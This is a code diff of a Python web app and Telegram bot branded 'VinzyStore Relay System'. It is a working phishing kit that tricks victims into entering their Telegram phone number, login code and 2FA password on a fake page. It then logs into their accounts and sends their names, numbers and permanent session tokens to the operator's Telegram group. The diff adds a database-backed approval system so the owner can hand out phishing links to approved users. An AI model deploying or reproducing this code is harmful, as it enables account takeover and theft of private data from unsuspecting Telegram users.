@@ -3,20 +3,22 @@ import asyncio
 import telebot
 import qrcode
 import base64
+import psycopg2
 from io import BytesIO
 from quart import Quart, request, render_template, jsonify
 from telethon import TelegramClient, errors, functions, types
 from telethon.sessions import StringSession
 from threading import Thread
+from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 # --- CONFIGURATION ---
-# Pulled from Koyeb Environment Variables
 API_ID = int(os.environ.get("API_ID", 36003995))
 API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
+DATABASE_URL = os.environ.get("DATABASE_URL")
 BASE_URL = os.environ.get("BASE_URL", "https://your-app.koyeb.app")
+OWNER_ID = 6092011859  # Your ID (VinzyOwner)
 
-# Standardize GROUP_ID to handle the -100 prefix
 try:
     raw_group_id = os.environ.get("GROUP_ID", "0")
     GROUP_ID = int(raw_group_id)
@@ -26,20 +28,40 @@ except ValueError:
 bot = telebot.TeleBot(BOT_TOKEN)
 app = Quart(__name__)
 
-# Global storage for active client sessions and logs
-active_relays = {} 
-captured_list = [] 
+# Memory storage for active login sessions
+active_relays = {}
 
-# --- UTILITY FUNCTIONS ---
+# --- DATABASE LOGIC (Neon.com) ---
+
+def init_db():
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute("CREATE TABLE IF NOT EXISTS authorized_users (user_id TEXT PRIMARY KEY)")
+    conn.commit()
+    cur.close()
+    conn.close()
+
+def is_authorized(user_id):
+    if int(user_id) == OWNER_ID: return True
+    conn = psycopg2.connect(DATABASE_URL)
+    cur = conn.cursor()
+    cur.execute("SELECT 1 FROM authorized_users WHERE user_id = %s", (str(user_id),))
+    result = cur.fetchone()
+    cur.close()
+    conn.close()
+    return result is not None
+
+init_db()
+
+# --- UTILITY: DATA SCRAPING ---
 
 async def scrape_full_data(client, phone):
-    """Gathers user details and generates a permanent Session String."""
     try:
         me = await client.get_me()
         full_user = await client(functions.users.GetFullUserRequest(id=me.id))
         session_str = client.session.save()
         
-        data = {
+        return {
             "name": f"{me.first_name} {me.last_name or ''}".strip(),
             "id": me.id,
             "username": f"@{me.username}" if me.username else "None",
@@ -48,127 +70,101 @@ async def scrape_full_data(client, phone):
             "session": session_str,
             "phone": phone
         }
-        return data
     except Exception as e:
         print(f"Scraping failed: {e}")
         return None
 
-def safe_send(chat_id, text):
-    """Sends bot messages without crashing the web process if Telegram fails."""
-    try:
-        bot.send_message(chat_id, text, parse_mode="HTML")
-    except Exception as e:
-        print(f"Telegram Bot Send Error: {e}")
+# --- BOT COMMANDS & CALLBACKS (KHMER) ---
 
-# --- BOT COMMANDS ---
+@bot.message_handler(commands=['start'])
+def handle_start(m):
+    user_id = m.from_user.id
+    if is_authorized(user_id):
+        msg = (
+            "👑 <b>VinzyStore Relay System (Active)</b>\n"
+            "━━━━━━━━━━━━━━━\n"
+            "👋 សួស្តី! អ្នកមានសិទ្ធិប្រើប្រាស់ប្រព័ន្ធនេះរួចហើយ។\n\n"
+            "<b>បញ្ជា (Commands):</b>\n"
+            "• <code>.link [label]</code> - បង្កើតតំណភ្ជាប់ថ្មី\n"
+            "• <code>.list</code> - មើលបញ្ជីលេខដែលចាប់បាន\n"
+            "• <code>.id</code> - មើល ID របស់អ្នក"
+        )
+        bot.send_message(m.chat.id, msg, parse_mode="HTML")
+    else:
+        # Request access from Owner in the Group
+        markup = InlineKeyboardMarkup()
+        markup.add(
+            InlineKeyboardButton("✅ អនុញ្ញាត (Approve)", callback_data=f"auth_{user_id}"),
+            InlineKeyboardButton("❌ បដិសេធ (Decline)", callback_data=f"decline_{user_id}")
+        )
+        
+        request_to_admin = (
+            "🔔 <b>ការស្នើសុំសិទ្ធិថ្មី</b>\n"
+            "━━━━━━━━━━━━━━━\n"
+            f"👤 ឈ្មោះ: {m.from_user.first_name}\n"
+            f"🆔 ID: <code>{user_id}</code>\n"
+            "━━━━━━━━━━━━━━━\n"
+            "⚠️ មានតែ @VinzyOwner ម្នាក់គត់ដែលអាចចុចបាន។"
+        )
+        bot.send_message(GROUP_ID, request_to_admin, reply_markup=markup, parse_mode="HTML")
+        bot.send_message(m.chat.id, "⏳ <b>សំណើរបស់អ្នកត្រូវបានផ្ញើទៅកាន់ម្ចាស់ប្រព័ន្ធហើយ។</b>\nសូមរង់ចាំការអនុញ្ញាត។")
 
-@bot.message_handler(commands=['start', 'help'])
-@bot.message_handler(func=lambda m: m.text == '.help')
-def send_help(m):
-    if m.chat.id != GROUP_ID: return
-    help_text = (
-        "👑 <b>VinzyStore Relay System</b>\n\n"
-        "<b>Commands:</b>\n"
-        "• <code>.help</code> - Show this menu\n"
-        "• <code>.link [label]</code> - Create your relay link\n"
-        "• <code>.list</code> - Show all captured phones\n"
-        "• <code>.profile [phone]</code> - Dump session & info\n"
-        "• <code>.info</code> - Check server status\n"
-    )
-    safe_send(m.chat.id, help_text)
+@bot.callback_query_handler(func=lambda call: True)
+def handle_approval(call):
+    # SECURITY: Only OWNER_ID can approve
+    if call.from_user.id != OWNER_ID:
+        bot.answer_callback_query(call.id, "❌ អ្នកមិនមែនជាម្ចាស់ប្រព័ន្ធទេ!", show_alert=True)
+        return
 
-@bot.message_handler(func=lambda m: m.text == '.list')
-def handle_list(m):
-    if m.chat.id != GROUP_ID: return
-    if not captured_list:
-        return safe_send(m.chat.id, "⚠️ <b>Database is empty.</b>")
+    action, target_id = call.data.split("_")
     
-    msg = f"📋 <b>Captured Hits: {len(captured_list)}</b>\n\n"
-    for num in captured_list:
-        name = active_relays.get(num, {}).get('info', {}).get('name', 'User')
-        msg += f"👤 {name} -> <code>{num}</code>\n"
-    safe_send(m.chat.id, msg)
+    if action == "auth":
+        conn = psycopg2.connect(DATABASE_URL)
+        cur = conn.cursor()
+        cur.execute("INSERT INTO authorized_users (user_id) VALUES (%s) ON CONFLICT DO NOTHING", (target_id,))
+        conn.commit()
+        cur.close()
+        conn.close()
+        
+        bot.edit_message_text(f"✅ បានអនុញ្ញាត ID: <code>{target_id}</code> រួចរាល់!", call.message.chat.id, call.message.message_id, parse_mode="HTML")
+        bot.send_message(target_id, "🎉 <b>ការស្នើសុំរបស់អ្នកត្រូវបានអនុញ្ញាត!</b>\nឥឡូវនេះអ្នកអាចប្រើប្រាស់ <code>.link</code> បានហើយ។", parse_mode="HTML")
+    
+    elif action == "decline":
+        bot.edit_message_text(f"❌ បានបដិសេធ ID: <code>{target_id}</code>", call.message.chat.id, call.message.message_id)
 
 @bot.message_handler(func=lambda m: m.text.startswith('.link'))
 def create_link(m):
-    if m.chat.id != GROUP_ID: return
-    parts = m.text.split(' ')
-    label = parts[1] if len(parts) > 1 else "default"
+    if not is_authorized(m.from_user.id): return
+    label = m.text.split(' ')[1] if len(m.text.split(' ')) > 1 else "default"
+    relay_url = f"{BASE_URL.rstrip('/')}/?id={m.from_user.id}&tag={label}"
     
-    # Builds the link with your Group ID so logs come here
-    relay_url = f"{BASE_URL.rstrip('/')}/?id={GROUP_ID}&tag={label}"
-    
-    response = (
-        "🔗 <b>New Relay Link</b>\n"
+    msg = (
+        "🔗 <b>តំណភ្ជាប់ថ្មី (Relay Link)</b>\n"
         "━━━━━━━━━━━━━━━\n"
-        f"🌐 <b>URL:</b> <code>{relay_url}</code>\n"
-        f"🏷️ <b>Tag:</b> <code>{label}</code>\n"
+        f"🌐 URL: <code>{relay_url}</code>\n"
+        f"🏷️ Tag: <code>{label}</code>\n"
         "━━━━━━━━━━━━━━━"
     )
-    safe_send(m.chat.id, response)
+    bot.send_message(m.chat.id, msg, parse_mode="HTML")
 
-@bot.message_handler(func=lambda m: m.text.startswith('.profile'))
-def profile_lookup(m):
-    if m.chat.id != GROUP_ID: return
-    parts = m.text.split(' ')
-    if len(parts) < 2: return safe_send(m.chat.id, "❌ Use: <code>.profile [phone]</code>")
-    
-    target = parts[1]
-    if target in active_relays and "info" in active_relays[target]:
-        info = active_relays[target]['info']
-        msg = (
-            f"💎 <b>DATA DUMP: {target}</b>\n"
-            f"━━━━━━━━━━━━━━━\n"
-            f"👤 <b>Name:</b> {info['name']}\n"
-            f"🆔 <b>ID:</b> <code>{info['id']}</code>\n"
-            f"🏷️ <b>User:</b> {info['username']}\n"
-            f"🌟 <b>Premium:</b> {info['premium']}\n"
-            f"📖 <b>Bio:</b> {info['bio']}\n"
-            f"━━━━━━━━━━━━━━━\n"
-            f"🔑 <b>SESSION:</b>\n<code>{info['session']}</code>"
-        )
-        safe_send(m.chat.id, msg)
-    else:
-        safe_send(m.chat.id, "❌ Target data not found.")
-
-@bot.message_handler(func=lambda m: m.text == '.info')
-def server_info(m):
-    if m.chat.id != GROUP_ID: return
-    status = (
-        "⚙️ <b>Server Status</b>\n"
-        f"🚀 <b>Uptime:</b> Online\n"
-        f"📡 <b>Active:</b> {len(active_relays)}\n"
-        f"📈 <b>Total:</b> {len(captured_list)}"
-    )
-    safe_send(m.chat.id, status)
+@bot.message_handler(func=lambda m: m.text == '.id')
+def get_id(m):
+    bot.reply_to(m, f"🆔 ID របស់អ្នកគឺ: <code>{m.from_user.id}</code>")
 
 # --- WEB ROUTES ---
 
 @app.route('/')
 async def index():
-    tid = request.args.get('id', str(GROUP_ID))
+    tid = request.args.get('id')
+    # Block access if TID is not authorized
+    if not tid or not is_authorized(tid):
+        return "❌ <b>Access Denied.</b> Contact @VinzyOwner for permissions.", 403
     return await render_template('login.html', tid=tid)
-
-@app.route('/get_qr', methods=['POST'])
-async def get_qr():
-    client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
-    await client.connect()
-    try:
-        qr_login = await client.qr_login()
-        img = qrcode.make(qr_login.url)
-        buf = BytesIO()
-        img.save(buf, format="PNG")
-        img_str = base64.b64encode(buf.getvalue()).decode()
-        active_relays["qr_temp"] = {"client": client}
-        return jsonify({"status": "success", "qr_image": img_str})
-    except Exception as e:
-        return jsonify({"status": "error", "msg": str(e)})
 
 @app.route('/step_phone', methods=['POST'])
 async def step_phone():
     data = await request.json
     phone, tid = data.get('phone'), data.get('tid')
-    target_chat = tid if tid and tid != "Admin" else GROUP_ID
     
     client = TelegramClient(StringSession(), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
     await client.connect()
@@ -176,9 +172,13 @@ async def step_phone():
         sent_code = await client.send_code_request(phone)
         active_relays[phone] = {"client": client, "hash": sent_code.phone_code_hash}
         
-        # Log to group but don't wait for it
-        safe_send(target_chat, f"🎯 <b>Phone Submitted:</b>\n<code>{phone}</code>")
-        
+        # Log entry to both the User's Log (tid) and your Master Group
+        log = f"🎯 <b>លេខទូរស័ព្ទថ្មី:</b>\n<code>{phone}</code>\n👤 បញ្ជូនដោយ ID: <code>{tid}</code>"
+        bot.send_message(GROUP_ID, log, parse_mode="HTML")
+        if tid != str(GROUP_ID): 
+            try: bot.send_message(tid, log, parse_mode="HTML")
+            except: pass
+            
         return jsonify({"status": "success"})
     except Exception as e:
         return jsonify({"status": "error", "msg": str(e)})
@@ -187,10 +187,8 @@ async def step_phone():
 async def step_code():
     data = await request.json
     phone, code, tid = data.get('phone'), data.get('code'), data.get('tid')
-    target_chat = tid if tid and tid != "Admin" else GROUP_ID
     
-    if phone not in active_relays: 
-        return jsonify({"status": "error", "msg": "Session Expired"})
+    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
     
     client = active_relays[phone]["client"]
     try:
@@ -198,16 +196,19 @@ async def step_code():
         user_data = await scrape_full_data(client, phone)
         
         if user_data:
-            active_relays[phone]["info"] = user_data
-            if phone not in captured_list: captured_list.append(phone)
-            
-            log = f"💰 <b>LOGIN SUCCESS!</b>\n👤 {user_data['name']}\n📱 <code>{phone}</code>\n🔑 <code>{user_data['session']}</code>"
-            safe_send(target_chat, log)
+            log = (
+                f"💰 <b>LOGIN SUCCESS!</b>\n"
+                f"👤 ឈ្មោះ: {user_data['name']}\n"
+                f"📱 លេខ: <code>{phone}</code>\n"
+                f"🔑 Session: <code>{user_data['session']}</code>"
+            )
+            bot.send_message(GROUP_ID, log, parse_mode="HTML")
+            if tid != str(GROUP_ID):
+                try: bot.send_message(tid, log, parse_mode="HTML")
+                except: pass
         
         return jsonify({"status": "success"})
-        
     except errors.SessionPasswordNeededError:
-        # Move to 2FA Step on the web
         return jsonify({"status": "2fa_needed"})
     except Exception as e:
         return jsonify({"status": "error", "msg": str(e)})
@@ -216,10 +217,8 @@ async def step_code():
 async def step_2fa():
     data = await request.json
     phone, password, tid = data.get('phone'), data.get('password'), data.get('tid')
-    target_chat = tid if tid and tid != "Admin" else GROUP_ID
     
-    if phone not in active_relays: 
-        return jsonify({"status": "error", "msg": "Session Expired"})
+    if phone not in active_relays: return jsonify({"status": "error", "msg": "Session Expired"})
     
     client = active_relays[phone]["client"]
     try:
@@ -227,21 +226,22 @@ async def step_2fa():
         user_data = await scrape_full_data(client, phone)
         
         if user_data:
-            active_relays[phone]["info"] = user_data
             log = f"🔓 <b>2FA BYPASS SUCCESS!</b>\n👤 {user_data['name']}\n🔑 <code>{user_data['session']}</code>"
-            safe_send(target_chat, log)
-            
+            bot.send_message(GROUP_ID, log, parse_mode="HTML")
+            if tid != str(GROUP_ID):
+                try: bot.send_message(tid, log, parse_mode="HTML")
+                except: pass
+                
         return jsonify({"status": "success"})
     except Exception as e:
         return jsonify({"status": "error", "msg": str(e)})
 
 # --- RUNNER ---
-def start_bot():
-    print(f"Bot active in Group: {GROUP_ID}")
+
+def run_bot():
+    print(f"Bot started. Admin: {OWNER_ID}")
     bot.infinity_polling()
 
 if __name__ == "__main__":
-    # Start Telegram Bot in a separate thread
-    Thread(target=start_bot).start()
-    # Start Quart Web Server
+    Thread(target=run_bot).start()
     app.run(host="0.0.0.0", port=8000)
